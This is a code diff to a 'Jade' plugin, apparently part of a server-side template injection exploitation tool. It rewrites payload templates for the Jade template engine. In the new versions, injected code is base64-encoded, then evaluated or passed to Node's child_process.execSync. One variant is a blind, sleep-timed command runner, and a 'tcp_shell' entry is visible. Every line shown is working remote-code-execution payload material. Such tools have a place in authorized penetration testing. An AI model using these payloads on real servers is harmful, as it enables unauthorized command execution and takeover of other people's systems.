@@ -34,7 +34,7 @@ class Jade(Plugin):
         },
         'evaluate' : {
             'call': 'render',
-            'evaluate': '= %(code)s'
+            'evaluate': """= eval(Buffer('%(code_b64)s', 'base64').toString())"""
         },
         'blind' : {
             'call': 'execute_blind',
@@ -44,11 +44,11 @@ class Jade(Plugin):
         # Not using execute here since it's rendered and requires set headers and trailers
         'execute_blind' : {
             'call': 'inject',
-            'execute_blind': """\n- global.process.mainModule.require("child_process").execSync("%(code)s && sleep %(delay)i")//"""
+            'execute_blind': """\n- global.process.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i')//"""
         },
         'execute' : {
             'call': 'render',
-            'execute': """= global.process.mainModule.require("child_process").execSync("%(code)s")"""
+            'execute': """= global.process.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString())"""
         },
         'tcp_shell' : {
             'call' : 'execute_blind',
